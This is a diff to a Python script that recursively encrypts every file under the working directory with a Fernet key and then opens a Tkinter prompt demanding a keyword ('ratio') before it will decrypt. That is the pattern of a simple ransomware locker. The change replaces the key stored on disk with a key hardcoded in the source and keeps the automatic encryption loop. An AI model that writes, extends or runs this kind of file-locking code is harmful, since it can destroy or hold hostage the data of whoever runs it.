@@ -4,17 +4,19 @@ from cryptography.fernet import Fernet
 import tkinter as tk
 from tkinter import filedialog
 
-KEY_FILE = "symmetric_key.key"
+# KEY_FILE = "symmetric_key.key"
 
-def load_symmetric_key():
-    if os.path.exists(KEY_FILE):
-        with open(KEY_FILE, 'rb') as f:
-            key = f.read()
-    # else:
-    #     key = Fernet.generate_key()
-    #     with open(KEY_FILE, 'wb') as f:
-    #         f.write(key)
-    return key
+man_key = '7YcQu1c94E2rJx3o9VCZ62A0L2rVYuMYa5W3H1IVyhQ='
+
+# def load_symmetric_key():
+#     if os.path.exists(KEY_FILE):
+#         with open(KEY_FILE, 'rb') as f:
+#             key = f.read()
+#     else:
+#         key = Fernet.generate_key()
+#         with open(KEY_FILE, 'wb') as f:
+#             f.write(key)
+#     return key
 
 def encrypt(dataFile, symmetric_key):
     if dataFile.name.endswith('.txt'):
@@ -51,13 +53,14 @@ def verify_keyword(keyword):
     # Modify this function to check if the keyword is correct
     return keyword == "ratio" 
 
-# Generate a symmetric key 
-symmetric_key = load_symmetric_key()
+# load the symmetric key 
+# symmetric_key = load_symmetric_key()
 
 # Encrypt all files in the current directory and its subdirectories
 directory = './'  # Change this to the directory containing the files to be encrypted
 for item in scanRecurse(directory):
-    encrypt(item, symmetric_key)
+    # encrypt(item, symmetric_key)
+    encrypt(item, man_key)
 
 # GUI to ask the user to enter the keyword for decryption
 root = tk.Tk()
@@ -76,7 +79,8 @@ error_label.pack()
 def submit_keyword():
     keyword = keyword_entry.get()
     if verify_keyword(keyword):
-        decrypt_with_symmetric_key(symmetric_key)
+        # decrypt_with_symmetric_key(symmetric_key)
+        decrypt_with_symmetric_key(man_key)
         print("Decryption completed successfully.")
     else:
         error_label.config(text="Incorrect keyword. Decryption cannot be performed.", fg="red")
